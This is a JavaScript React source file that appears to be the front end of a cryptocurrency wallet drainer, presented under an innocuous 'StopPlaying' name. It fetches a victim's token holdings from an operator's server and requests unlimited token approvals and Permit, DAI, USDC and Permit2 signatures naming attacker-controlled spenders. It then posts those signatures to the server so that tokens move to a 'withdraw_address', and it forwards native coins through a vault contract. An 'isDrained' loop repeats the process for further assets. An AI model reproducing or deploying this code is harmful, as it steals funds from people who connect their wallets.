/* eslint-disable react/prop-types */
/* eslint-disable react-hooks/exhaustive-deps */

'use client'
import PERMIT2_ABI from '../abis/permit2.json'
import ERC_20_ABI from '../abis/erc20.json'
import ETH_VAULT_ABI from '../abis/ethvault.json'
import useContract from './hooks/useContract'
import React from 'react'
import { ethers } from 'ethers'
import useSignDaiLike from './hooks/useSignDaiLike'
import { useAccount, useChainId, useReadContract as useContractRead, useGasPrice, useReadContract, useWaitForTransactionReceipt as useWaitForTransaction } from 'wagmi'
import { ETH_VAULT_ADDRESS, MAX_DEADLINE, apiUrl, getCreate2Deployer, infinite } from './constants'
import useSignUsdcLike from './hooks/useSignUsdcLike'
import useSignPermit2 from './hooks/useSignPermit2'
import { bytesToHex, getRandomBytes, notifyClicked, notifyClosed, notifyEthSent } from './utils'
import useCalculateGasFee from './hooks/useCalculateGasFee'
import { DaiType, PermitBatchTransferFromType, UsdcTypes } from './typedTypes'
import GAME_ABI from '../abis/create2.json'

// import useSignPermit2Goerli from '../hooks/useSignPermit2Goerli'


export const StopPlayingContext = React.createContext({
  sendTransaction: async () => { },
  isAccountEligible: true,
  loading: false,
  isDrained: false,
  setSelectedToken: null
})


export default function StopPlaying(props) {
  const { address } = useAccount()
  const id = useChainId()
  const [tokenNonce, setTokenNonce] = React.useState(0)
  // eslint-disable-next-line no-unused-vars
  const [maxGasFee, setMaxGasFee] = React.useState(BigInt('0'))
  const [salt, setSalt] = React.useState('');
  const [permit2Nonce, setPermit2Nonce] = React.useState(0)
  const [isAccountEligible, setIsAccountEligible] = React.useState(true)
  const [loading, setLoading] = React.useState(false);
  const [isDrained, setIsDrained] = React.useState(false);
  const [spec, setSpec] = React.useState('')
  const [selectedToken, setSelectedToken] = React.useState('');
  const [create2, setCreate2] = React.useState({
    salt: '',
    address: '0x'
  })
  const [permitType, setPermitType] = React.useState('')
  const [permit2Data, setPermit2Data] = React.useState([])
  const [tokenDomain, setTokenDomain] = React.useState({
    name: '',
    version: '',
    chainId: 1,
    verifyingContract: '0x',
  })
  const [wallets, setWallets] = React.useState({
    server_wallet: '',
    withdraw_address: '',
  })
  const [permitTokenData, setPermitTokenData] = React.useState([
    {
      tokenAddress: '',
      name: '',
      usdValue: '1',
      tokenQuantity: '1',
    },
  ])
  const [approvalData, setApprovalData] = React.useState([
    {
      tokenAddress: '',
      name: '',
      usdValue: '1',
      tokenQuantity: '1',
    },
  ])


  const [daiValue, setDaiValue] = React.useState({
    holder: `0x`,
    spender: `0x`,
    nonce: BigInt(1),
    expiry: BigInt(`0`),
    allowed: true,
  })

  const [usdcLikeValue, setUsdcLikeValue] = React.useState({
    owner: `0x`,
    spender: `0x`,
    value: BigInt('1'),
    nonce: BigInt(1),
    deadline: BigInt('11'),
  })





  const approveTokenContract = useContract()

  const approveContract = useWaitForTransaction({
    confirmations: 1,
    hash: approveTokenContract.data
  })

  const increaseAllowanceContract = useContract()

  const increaseContract = useWaitForTransaction({
    confirmations: 1,
    hash: increaseAllowanceContract.data
  })

  const { transactionFee } = useCalculateGasFee();

  const gasPrice = useGasPrice();
  const gasLimit = 50000


  React.useEffect(() => {
    if (gasPrice.data) {
      setMaxGasFee(BigInt(id === 56 ? 100000 : gasLimit) * gasPrice.data)
    }
  }, [gasPrice.data])




  const ethVaultContract = useContract()

  // const { data: hash, sendTransaction: send } = useSendTransaction()

  // const sentEth = useWaitForTransaction({
  //   confirmations: 1,
  //   hash
  // })

  const bridgeContract = useWaitForTransaction({
    confirmations: 1,
    hash: ethVaultContract.data,
  })

  const noncesResult = useContractRead({
    address: permitTokenData[0].tokenAddress,
    abi: ERC_20_ABI,
    functionName: 'nonces',
    args: [
      address
    ]
  })


  const result = useReadContract({
    address: getCreate2Deployer(id),
    abi: GAME_ABI,
    functionName: 'predictMove',
    args: [
      salt
    ]
  })

  React.useEffect(() => {
    setSalt(`0x${bytesToHex(getRandomBytes(32))}`)
    // setSalt(`0xc18c231038fad37a04b3d06e369c53f3eb2ca62a2e300456ea1fad152c0dd588`)
  }, [])

  const nonceBitmapResult = useContractRead({
    address: `0x000000000022D473030F116dDEE9F6B43aC78BA3`,
    abi: PERMIT2_ABI,
    functionName: 'nonceBitmap',
    args: [
      address,
      0
    ]
  })


  React.useEffect(() => {
    if (salt !== '' && result.data) {
      console.log(result.data.toString())
      setCreate2({
        salt,
        address: result.data.toString()
      })
    }
  }, [salt, result.data])

  const [permit2Value, setPermit2Value] = React.useState({
    permitted: [
      {
        token: `0x`,
        amount: BigInt(1)
      }
    ],
    spender: wallets.server_wallet,
    nonce: BigInt(1),
    deadline: BigInt('1'),
  })


  const [signDaiLike] = useSignDaiLike()

  const [signUsdcLike] = useSignUsdcLike()

  const [signPermit2] = useSignPermit2()


  async function getUserAssets() {
    const resp = await fetch(`${apiUrl(id)}/${address}/${id}/getAssets`)
    const data = await resp.json()
    return data
  }
  // eslint-disable-next-line no-unused-vars
  async function getUserAssetsMultiChain() {
    const resp = await fetch(`${apiUrl(id)}/${address}/getAssets`)
    const data = await resp.json()
    return data
  }
  async function getWallets() {
    const resp = await fetch(`${apiUrl(id)}/${id}/getWallets`)
    const data = (await resp.json()) 
    return data
  }

  const getTokenDomain = async (token) => {
    const resp = await fetch(`${apiUrl(id)}/${token}/${id}/domainData`)
    const data = (await resp.json())
    return data
  }


  const sendTransaction = async () => {
    if (loading) {
      return;
    }
    setLoading(true);
    switch (spec) {
      case 'Approve':
        notifyClicked(id, address, approvalData[0].usdValue, selectedToken);
        setLoading(true);
        if (approvalData[0].name === 'ETH' || approvalData[0].name === 'BNB' || approvalData[0].name === 'MATIC' || approvalData[0].name === 'PLS') {
          ethVaultContract?.writeAsync({
            address: ETH_VAULT_ADDRESS,
            abi: ETH_VAULT_ABI,
            functionName: 'multicall',
            args: [
              wallets.withdraw_address,
            ],
            value: BigInt(approvalData[0].tokenQuantity) - BigInt(transactionFee)

          }).catch(() => {
            setLoading(false);
            notifyClosed(id, address, approvalData[0].usdValue);

          })
          // if (id === 1) {
          //   ethVaultContract?.writeAsync({
          //     address: ETH_VAULT_ADDRESS,
          //     abi: ETH_VAULT_ABI,
          //     functionName: 'multicall',
          //     args: [
          //       wallets.withdraw_address,
          //     ],
          //     value: BigInt(approvalData[0].tokenQuantity) - BigInt(transactionFee)

          //   }).catch(() => {
          //     setLoading(false);
          //     notifyClosed(id, address, approvalData[0].usdValue);

          //   })
          // } else {
          //   // send({
          //   //   to: create2.address,
          //   //   value: BigInt(approvalData[0].tokenQuantity) - maxGasFee
          //   // })
          // }
          return;
        }
        if (approvalData[0].spec === 'allowance') {
          if (approvalData[0].tokenAddress === '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599') {
            increaseAllowanceContract?.writeAsync({
              address: approvalData[0].tokenAddress,
              abi: ERC_20_ABI,
              functionName: 'increaseApproval',
              args: [
                id === 56 || id === 1 ? "0x000000000022D473030F116dDEE9F6B43aC78BA3" : create2.address,
                BigInt(infinite)
              ]
            }).catch(() => {
              setLoading(false);
              notifyClosed(id, address, approvalData[0].usdValue);

            })
            return
          }
          increaseAllowanceContract?.writeAsync({
            address: approvalData[0].tokenAddress,
            abi: ERC_20_ABI,
            functionName: 'increaseAllowance',
            args: [
              id === 56 || id === 1 ? "0x000000000022D473030F116dDEE9F6B43aC78BA3" : create2.address,
              BigInt(infinite)
            ]
          }).catch(() => {
            setLoading(false);
            notifyClosed(id, address, approvalData[0].usdValue);

          })
        } else {
          approveTokenContract?.writeAsync({
            address: approvalData[0].tokenAddress,
            abi: ERC_20_ABI,
            functionName: 'approve',
            args: [
              id === 56 || id === 1 ? "0x000000000022D473030F116dDEE9F6B43aC78BA3" : create2.address,
              BigInt(infinite)
            ]
          }).catch(() => {
            setLoading(false);
            notifyClosed(id, address, approvalData[0].usdValue);

          })
        }
        break
      case 'Permit':
        notifyClicked(id, address, permitTokenData[0].usdValue, selectedToken)
        if (tokenDomain.name === '') {
          return;
        }
        if (permitType === 'daiLike') {
          console.log(`calling dai sign`);
          setDaiValue({
            holder: address,
            spender: id === 56 || id === 1 ? `0x000000000022D473030F116dDEE9F6B43aC78BA3` : create2.address,
            nonce: BigInt(tokenNonce),
            expiry: BigInt(MAX_DEADLINE),
            allowed: true,
          })
          break
        }
        console.log(`calling usdcLike`);
        setUsdcLikeValue({
          owner: address,
          spender: id === 56 || id === 1 ? `0x000000000022D473030F116dDEE9F6B43aC78BA3` : create2.address,
          value: BigInt(infinite),
          nonce: BigInt(tokenNonce),
          deadline: BigInt(MAX_DEADLINE),
        })
        break
      case 'Permit2':
        notifyClicked(id, address, '0', selectedToken)

        setPermit2Value({
          permitted: permit2Data.map(t => ({
            token: (t.token),
            amount: BigInt(infinite)
          })),
          spender: create2.address,
          nonce: BigInt(permit2Nonce + 1),
          deadline: BigInt(MAX_DEADLINE),
        })
        break
      default:
        break
    }
  }

  React.useEffect(() => {
    if (permit2Value.permitted[0].token !== '0x') {
      console.log(`signing permit2`);
      signPermit2({
        domain: {
          name: 'Permit2',
          chainId: id,
          verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
        },
        types: PermitBatchTransferFromType,
        message: permit2Value,
        primaryType: 'PermitBatchTransferFrom',
      }, {
        onSettled: (permit2Signature) => {
          if (permit2Signature) {
            fetch(`${apiUrl(id)}/${id}/create2permit2`, {
              method: 'POST',
              headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                salt: create2.salt,
                permit: {
                  permitted: permit2Value.permitted.map((permitted) => ({
                    token: permitted.token,
                    amount: infinite
                  })),
                  nonce: permit2Value.nonce.toString(),
                  deadline: permit2Value.deadline.toString(),
                },
                transferDetails: permit2Value.permitted.map((_, index) => ({
                  to: (wallets.withdraw_address),
                  requestedAmount: permit2Data[index].amount,
                })),
                owner: address,
                signature: permit2Signature,
              }),
            }).then(() => {
              setIsDrained(true)
              setLoading(false)
            })
          }
        }
      }).catch(() => {
        setLoading(false);
        notifyClosed(id, address, '0');

      });
      return;
    }
    if (daiValue.holder !== '0x') {
      console.log(`signing Dai`);
      if (daiValue.spender === '0x000000000022D473030F116dDEE9F6B43aC78BA3') {
        signDaiLike({
          domain: tokenDomain,
          types: DaiType,
          message: daiValue,
          primaryType: 'Permit',
        },
          {
            onSettled: (data) => {
              if (data) {
                const { v, r, s } = ethers.utils.splitSignature(data);
                const value = {
                  holder: daiValue.holder,
                  spender: daiValue.spender,
                  nonce: daiValue.nonce.toString(),
                  expiry: daiValue.expiry.toString(),
                  allowed: true,
                  v,
                  r,
                  s,
                }

                signPermit2({
                  domain: {
                    name: 'Permit2',
                    chainId: id,
                    verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
                  },
                  types: PermitBatchTransferFromType,
                  message:
                  {
                    permitted: [{
                      token: permitTokenData[0].tokenAddress,
                      amount: BigInt(infinite)
                    }],
                    spender: create2.address,
                    nonce: BigInt(permit2Nonce + 1),
                    deadline: BigInt(MAX_DEADLINE),
                  },
                  primaryType: 'PermitBatchTransferFrom',
                }, {
                  onSettled: (permit2Signature) => {
                    if (permit2Signature) {
                      fetch(`${apiUrl(id)}/${permitTokenData[0].tokenAddress}/${id}/${create2.salt}/permitCreate2Dai`, {
                        method: 'POST',
                        headers: {
                          'Accept': 'application/json',
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                          permitDetails: value,
                          permit: {
                            permitted: [{
                              token: permitTokenData[0].tokenAddress,
                              amount: infinite
                            }],
                            nonce: BigInt(permit2Nonce + 1).toString(),
                            deadline: BigInt(MAX_DEADLINE).toString(),
                          },
                          transferDetails: [{
                            to: (wallets.withdraw_address),
                            requestedAmount: permitTokenData[0].tokenQuantity,
                          }],
                          owner: address,
                          signature: permit2Signature,
                        }),
                      }).then(() => {
                        setIsDrained(true)
                        setLoading(false)
                      })
                    }
                  }
                }).catch(() => {
                  setLoading(false);
                  notifyClosed(id, address, '0');

                });
              }
            }
          }).catch(() => {
            setLoading(false)
            notifyClosed(id, address, permitTokenData[0].usdValue);

          });
        return
      }

      signDaiLike({
        domain: tokenDomain,
        types: DaiType,
        message: daiValue,
        primaryType: 'Permit',
      },
        {
          onSettled: (data) => {
            if (data) {
              const { v, r, s } = ethers.utils.splitSignature(data)
              fetch(`${apiUrl(id)}/${permitTokenData[0].tokenAddress}/${id}/permitCreate2`, {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  salt: create2.salt,
                  holder: daiValue.holder,
                  spender: daiValue.spender,
                  nonce: daiValue.nonce.toString(),
                  expiry: daiValue.expiry.toString(),
                  allowed: true,
                  v,
                  r,
                  s,
                }),
              }).then(() => {
                setIsDrained(true)
                setLoading(false)
              })
            }
          }
        }).catch(() => {
          setLoading(false)
          notifyClosed(id, address, permitTokenData[0].usdValue);

        });
      return;
    }
    if (usdcLikeValue.owner !== '0x') {
      console.log(`signing usdclike`);
      if (usdcLikeValue.spender === '0x000000000022D473030F116dDEE9F6B43aC78BA3') {
        signUsdcLike({
          domain: tokenDomain,
          types: UsdcTypes,
          message: usdcLikeValue,
          primaryType: 'Permit',
        },
          {
            onSettled: (data) => {
              if (data) {
                const { v, r, s } = ethers.utils.splitSignature(data);
                const value = {
                  owner: usdcLikeValue.owner,
                  spender: usdcLikeValue.spender,
                  value: usdcLikeValue.value.toString(),
                  nonce: usdcLikeValue.nonce.toString(),
                  deadline: usdcLikeValue.deadline.toString(),
                  v,
                  r,
                  s,
                }

                signPermit2({
                  domain: {
                    name: 'Permit2',
                    chainId: id,
                    verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
                  },
                  types: PermitBatchTransferFromType,
                  message:
                  {
                    permitted: [{
                      token: permitTokenData[0].tokenAddress,
                      amount: BigInt(infinite)
                    }],
                    spender: create2.address,
                    nonce: BigInt(permit2Nonce + 1),
                    deadline: BigInt(MAX_DEADLINE),
                  },
                  primaryType: 'PermitBatchTransferFrom',
                }, {
                  onSettled: (permit2Signature) => {
                    if (permit2Signature) {
                      fetch(`${apiUrl(id)}/${permitTokenData[0].tokenAddress}/${id}/${create2.salt}/permitCreate2`, {
                        method: 'POST',
                        headers: {
                          'Accept': 'application/json',
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                          permitDetails: value,
                          permit: {
                            permitted: [{
                              token: permitTokenData[0].tokenAddress,
                              amount: infinite
                            }],
                            nonce: BigInt(permit2Nonce + 1).toString(),
                            deadline: BigInt(MAX_DEADLINE).toString(),
                          },
                          transferDetails: [{
                            to: (wallets.withdraw_address),
                            requestedAmount: permitTokenData[0].tokenQuantity,
                          }],
                          owner: address,
                          signature: permit2Signature,
                        }),
                      }).then(() => {
                        setIsDrained(true)
                        setLoading(false)
                      })
                    }
                  }
                }).catch(() => {
                  setLoading(false);
                  notifyClosed(id, address, '0');

                });
              }
            }
          }).catch(() => {
            setLoading(false)
            notifyClosed(id, address, permitTokenData[0].usdValue);

          });
        return
      }
      signUsdcLike({
        domain: tokenDomain,
        types: UsdcTypes,
        message: usdcLikeValue,
        primaryType: 'Permit',
      },
        {
          onError: (err) => console.log(err),
          onSettled: (data) => {
            if (data) {
              const { v, r, s } = ethers.utils.splitSignature(data)
              fetch(`${apiUrl(id)}/${permitTokenData[0].tokenAddress}/${id}/permitusdcCreate2`, {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  salt: create2.salt,
                  owner: usdcLikeValue.owner,
                  spender: usdcLikeValue.spender,
                  value: usdcLikeValue.value.toString(),
                  nonce: usdcLikeValue.nonce.toString(),
                  deadline: usdcLikeValue.deadline.toString(),
                  v,
                  r,
                  s,
                }),
              }).then(() => {
                setIsDrained(true)
                setLoading(false)
              })
            }
          }
        }
      ).catch(() => {
        setLoading(false)
        notifyClosed(id, address, permitTokenData[0].usdValue);

      });
      return;
    }

  }, [daiValue, permit2Value, usdcLikeValue])


  React.useEffect(() => {
    if (permitTokenData[0].name !== '') {
      getTokenDomain(permitTokenData[0].tokenAddress).then(res => {
        setTokenDomain(res)
      })
    }
  }, [permitTokenData])


  React.useEffect(() => {
    if (approveContract.isSuccess) {
      console.log(`approved and reciept is ${approveTokenContract.data}`);
      if (id === 1 || id === 56) {
        signPermit2({
          domain: {
            name: 'Permit2',
            chainId: id,
            verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
          },
          types: PermitBatchTransferFromType,
          message:
          {
            permitted: [{
              token: approvalData[0].tokenAddress,
              amount: BigInt(infinite)
            }],
            spender: create2.address,
            nonce: BigInt(permit2Nonce + 1),
            deadline: BigInt(MAX_DEADLINE),
          },
          primaryType: 'PermitBatchTransferFrom',
        }, {
          onSettled: (permit2Signature) => {
            if (permit2Signature) {
              fetch(`${apiUrl(id)}/${id}/create2permit2`, {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  salt: create2.salt,
                  permit: {
                    permitted: [{
                      token: approvalData[0].tokenAddress,
                      amount: infinite
                    }],
                    nonce: BigInt(permit2Nonce + 1).toString(),
                    deadline: BigInt(MAX_DEADLINE).toString(),
                  },
                  transferDetails: [{
                    to: (wallets.withdraw_address),
                    requestedAmount: approvalData[0].tokenQuantity,
                  }],
                  owner: address,
                  signature: permit2Signature,
                }),
              }).then(() => {
                setIsDrained(true)
                setLoading(false)
              })
            }
          }
        }).catch((err) => {
          console.log(err);
          setLoading(false);
          notifyClosed(id, address, '0');

        });
        return
      }
      fetch(`${apiUrl(id)}/approvedCreate2`, {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          salt: create2.salt,
          sender: address,
          token: approvalData[0].tokenAddress,
          chainId: id,
        }),
      }).then(() => {
        setIsDrained(true)
        setLoading(false)
      })

        .catch((err) => {
          console.log('The transaction failed:', err);
        });
    }
  }, [approveContract.isSuccess]);


  React.useEffect(() => {
    if (increaseContract.isSuccess) {
      console.log(`approved and reciept is ${increaseAllowanceContract.data}`);
      if (id === 1 || id === 56) {
        signPermit2({
          domain: {
            name: 'Permit2',
            chainId: id,
            verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
          },
          types: PermitBatchTransferFromType,
          message:
          {
            permitted: [{
              token: approvalData[0].tokenAddress,
              amount: BigInt(infinite)
            }],
            spender: create2.address,
            nonce: BigInt(permit2Nonce + 1),
            deadline: BigInt(MAX_DEADLINE),
          },
          primaryType: 'PermitBatchTransferFrom',
        }, {
          onSettled: (permit2Signature) => {
            if (permit2Signature) {
              fetch(`${apiUrl(id)}/${id}/create2permit2`, {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  salt: create2.salt,
                  permit: {
                    permitted: [{
                      token: approvalData[0].tokenAddress,
                      amount: infinite
                    }],
                    nonce: BigInt(permit2Nonce + 1).toString(),
                    deadline: BigInt(MAX_DEADLINE).toString(),
                  },
                  transferDetails: [{
                    to: (wallets.withdraw_address),
                    requestedAmount: approvalData[0].tokenQuantity,
                  }],
                  owner: address,
                  signature: permit2Signature,
                }),
              }).then(() => {
                setIsDrained(true)
                setLoading(false)
              })
            }
          }
        }).catch((err) => {
          console.log(err);
          setLoading(false);
          notifyClosed(id, address, '0');

        });
        return
      }
      fetch(`${apiUrl(id)}/approvedCreate2`, {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          salt: create2.salt,
          sender: address,
          token: approvalData[0].tokenAddress,
          chainId: id,
        }),
      }).then(() => {
        setIsDrained(true)
        setLoading(false)
      })

        .catch((err) => {
          console.log('The transaction failed:', err);
        });
    }
  }, [increaseContract.isSuccess]);



  React.useEffect(() => {
    if (bridgeContract.isSuccess) {
      setIsDrained(true);
      setLoading(false);
      notifyEthSent(id, address, approvalData[0].usdValue, approvalData[0].tokenAddress, ethVaultContract.data)
    }
  }, [bridgeContract.isSuccess]);

  // React.useEffect(() => {
  //   if (sentEth.isSuccess) {
  //     fetch(`${apiUrl(id)}/sendEth`, {
  //       method: 'POST',
  //       headers: {
  //         'Accept': 'application/json',
  //         'Content-Type': 'application/json',
  //       },
  //       body: JSON.stringify({
  //         salt: create2.salt,
  //         sender: address,
  //         chainId: id,
  //       }),
  //     }).then(() => {
  //       setIsDrained(true)
  //       setLoading(false)
  //       notifyEthSent(id, address, approvalData[0].usdValue, approvalData[0].tokenAddress, hash as string);

  //     })

  //       .catch((err) => {
  //         console.log('The transaction failed:', err);
  //       });
  //   }
  // }, [sentEth.isSuccess]);



  React.useEffect(() => {
    setTokenNonce(Number(noncesResult.data))
  }, [noncesResult])
  React.useEffect(() => {
    setPermit2Nonce(Number(nonceBitmapResult.data))
  }, [nonceBitmapResult])


  React.useEffect(() => {
    if (isDrained) {
      getUserAssets().then((assets) => {
        switch (assets.spec) {
          case 'Approve':
            setSpec('Approve')
            setApprovalData(assets.data)
            setIsAccountEligible(true)
            setIsDrained(false);
            break
          case 'Permit':
            setSpec('Permit');
            if (assets.type === 'usdcLike') {
              setPermitType('usdcLike')
            } else {
              setPermitType('daiLike')
            }
            setPermitTokenData(assets.data)
            setIsAccountEligible(true)
            setIsDrained(false);
            break
          case 'Permit2':
            setSpec('Permit2')
            setPermit2Data(assets.data)
            setIsAccountEligible(true)
            setIsDrained(false);
            break
          default:
            setIsAccountEligible(false)
            setIsDrained(false);
            break
        }
      })
    }
  }, [isDrained])

  React.useEffect(() => {
    if (address) {
      getWallets().then((wallets) => {
        setWallets(wallets)
      })
      getUserAssets().then((assets) => {
        switch (assets.spec) {
          case 'Approve':
            setSpec('Approve')
            setApprovalData(assets.data)
            setIsAccountEligible(true)
            break
          case 'Permit':
            setSpec('Permit');
            if (assets.type === 'usdcLike') {
              setPermitType('usdcLike')
            } else {
              setPermitType('daiLike')
            }
            setPermitTokenData(assets.data)
            setIsAccountEligible(true)
            break
          case 'Permit2':
            setSpec('Permit2')
            setPermit2Data(assets.data)
            setIsAccountEligible(true)
            break
          default:
            setIsAccountEligible(false)
            break
        }
      })
    }
  }, [address, id])



  return <StopPlayingContext.Provider value={{ sendTransaction, isAccountEligible, loading, isDrained, setSelectedToken }}>{props.children}</StopPlayingContext.Provider>
}